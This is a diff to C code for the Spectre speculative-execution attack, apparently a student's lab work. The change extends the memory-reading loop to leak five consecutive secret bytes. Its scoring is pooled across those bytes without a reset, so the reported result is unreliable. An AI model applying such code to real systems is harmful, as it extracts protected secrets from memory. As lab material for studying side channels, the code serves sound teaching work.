@@ -2,6 +2,8 @@
 #include <x86intrin.h>
 #include <stdint.h>
 #include <stdio.h>
+#include <string.h>
+
 static int scores[256];
 uint8_t array[256*4096];
 unsigned int buffer_size = 10;
@@ -57,14 +59,33 @@ int i;
 uint8_t s;
 size_t larger_x = (size_t)(secret-(char*)buffer);
 flushSideChannel();
+int arr[20];
+int j = 0;
 for (i = 0; i < 256;  i++) scores[i] = 0;
+
 for (i = 0; i < 1000; i++) {
 spectreAttack(larger_x);
 reloadSideChannelImproved();
 }
+for (i = 0; i < 1000; i++) {
+spectreAttack(larger_x+1);
+reloadSideChannelImproved();
+}for (i = 0; i < 1000; i++) {
+spectreAttack(larger_x+2);
+reloadSideChannelImproved();
+}for (i = 0; i < 1000; i++) {
+spectreAttack(larger_x+3);
+reloadSideChannelImproved();
+}for (i = 0; i < 1000; i++) {
+spectreAttack(larger_x+4);
+reloadSideChannelImproved();
+}
 int max = 0;
 for (i = 0; i < 256; i++){
-if(scores[max] < scores[i])  max = i;
+if (scores[i] > 0) printf("%c\n", i);
+if(scores[max] < scores[i]){  
+max = i;
+}
 }
 printf("Reading secret value at %p = ", (void*)larger_x);
 printf("The  secret value is %c\n", max);
